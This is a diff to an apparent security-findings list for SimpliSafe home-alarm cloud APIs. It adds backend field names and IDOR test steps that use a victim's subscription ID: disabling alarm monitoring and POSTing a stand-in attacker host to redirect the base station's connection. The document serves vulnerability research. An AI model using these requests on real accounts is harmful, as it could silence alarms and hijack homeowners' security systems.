@@ -232,7 +232,8 @@ FINDINGS = [
                   '(4) Write {autoRearm:false}: prevent system from rearming after alarm triggered. '
                   '(5) Write {pinResettable:true}: enable PIN reset vector. '
                   'Unlike F8 (one-time state change), admin settings persist indefinitely. '
-                  'obiwanA/obiwanB = internal codenames for unknown config — RE pending. '
+                  'obiwanA/obiwanB = base station backend connection hostnames (bb1/bb2.simplisafe.com in prod). '
+                  'See F41 for C2 redirect attack via these fields. '
                   'Test: GET /v1/ss3/subscriptions/{victim_sid}/settings/admin with own token; '
                   '200 = CRITICAL; then test POST with {admin:{monitoring:false}}.'),
     Finding("F31", "CRITICAL", "Monitoring Feature Flag IDOR — Disable LiveGuard/VisualVerification on Victim",
@@ -477,7 +478,14 @@ FINDINGS = [
                   'Read test: GET /ss3/subscriptions/{victim_sid}/settings?settingsType=SYSTEM with own token; '
                   '200+{admin:{obiwanA:"bb1.simplisafe.com"}} = field exposed, IDOR confirmed on read. '
                   'Write test: POST same endpoint with {admin:{obiwanA:"probe.attacker-controlled.test"}}; '
-                  '200/204 = write accepted = CRITICAL C2 redirect capability.'),
+                  '200/204 = write accepted = CRITICAL C2 redirect capability. '
+                  'V2 PATH: getPbSettingsV2(@Path("sid"), @Query("settingsType"), @Query("cached")) -> '
+                  'GetPbSettingV2Response{settings: PbSystemSettingsV2Response{admin: AdminSettingsResponse{server1, server2}}} '
+                  '(yodaservice/responses/AdminSettingsResponse.java). '
+                  'AdminSettingsResponse additionally exposes: phone1 (String), phone2 (String) — monitoring center contact numbers; '
+                  'newAccount (String) — potential account migration/reassignment field. '
+                  'V2 read path: GET /ss3/subscriptions/{sid}/settings?settingsType=ADMIN (V2 endpoint). '
+                  'V2 write: POST same, body includes server1/server2 override.'),
     Finding("F42", "CRITICAL", "WiFi PSK Plaintext Exposure via Cloud Normal Settings IDOR (candidate)",
             "yoda", "/ss3/subscriptions/{sid}/settings", "GET", {"settingsType": "NORMAL"},
             verified=False,
